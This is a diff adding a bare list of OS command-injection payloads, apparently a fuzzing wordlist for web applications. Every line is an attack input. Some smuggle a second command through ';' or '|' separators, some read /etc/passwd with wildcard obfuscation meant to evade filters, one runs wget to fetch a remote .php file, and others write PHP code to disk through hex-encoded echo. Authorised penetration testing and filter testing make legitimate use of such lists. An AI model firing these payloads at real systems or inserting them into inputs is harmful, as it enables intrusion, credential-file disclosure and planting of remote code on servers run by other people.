@@ -1,0 +1,16 @@
+echo AGIYMZ$((69+52))$(echo AGIYMZ)AGIYMZ
+ echo TDJHRY$((30+41))$(echo TDJHRY)TDJHRY
+;echo MPCSBG$((54+42))$(echo MPCSBG)MPCSBG
+; ls
+| ls
+| cat /etc/passwd
+| /bin/ca? /et?/passw?
+| php
+| /usr/bin/p?p -v
+| /usr/bin/wge? https://test.com/somefile.php
+| /bin/ech? "aaaaaaa"
+| /bin/ech? hello > aaaaa
+| /bin/ech? hello | /usr/bin/ech?
+| /bin/ech? aaa > aaaaaaa
+| /bin/ech* -ne \\x3f\\x70\\x68\\x70\\x20
+| /bin/ech* -n -e \\x3c\\x3f\\x70\\x68\\x70\\x20\\x65\\x63\\x68\\x6f\\x20\\x27\\x68\\x65\\x6c\\x6c\\x6f\\x27\\x3b
